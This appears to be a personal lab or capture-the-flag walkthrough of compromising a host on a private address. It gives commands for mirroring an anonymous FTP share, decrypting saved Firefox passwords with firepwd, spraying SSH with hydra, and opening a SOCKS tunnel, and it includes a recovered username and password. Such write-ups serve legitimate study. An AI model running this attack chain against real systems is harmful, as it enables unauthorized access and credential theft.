## Metadata
- Anonymous login enabled at port 21
	- Run `wget -m --no-passive-ftp ftp://anonymous:@192.168.133.110` to download everything.![[Pasted image 20240315122724 1 1 1 1.png]]
- One can find `.mozilla` directory containing `logins.json` and `key4.db` under `192.168.133.110/interns/backup/users/malika/.mozilla/firefox/3ot0ydzb.default`.![[Pasted image 20240315125252 1 1 1 1.png]]
	- https://github.com/lclevy/firepwd
	- Run `python3 firepwd.py -d ../../loot/192.168.133.110/interns/backup/users/malika/.mozilla/firefox/3ot0ydzb.default` to retrieve potential password for user `malika`![[Pasted image 20240315124944 1 1 1 1.png]]![[Pasted image 20240315124915 1 1 1 1.png]]
	- Copy and paste all potential password into `malika_pass.txt`.![[Pasted image 20240315125031 1 1 1 1.png]]
	- Run `hydra -l malika -P malika_pass.txt -e nsr 192.168.133.110 ssh` to spray the password against SSH and identify one valid pair of credential as `malika:Anisoptera_Odonata4!`.![[Pasted image 20240315125134 1 1 1 1.png]]
- Run `ss -tlnp` will discover 2 more ports are open but unreachable because `27017` is listening on localhost and `3000` potentially blocked by firewall.![[Pasted image 20240315131928 1 1 1 1.png]]
# Tunneling 
- `ssh -v -N -D 9999 malika@192.168.133.110`![[Pasted image 20240315131650 1 1 1 1.png]]
- ![[Pasted image 20240315131748 1 1 1 1.png]]
# Exploitation
- Login through SSH by `ssh malika@192.168.133.110`
- ![[Pasted image 20240315125337 1 1 1 1.png]]
# PrivEsc
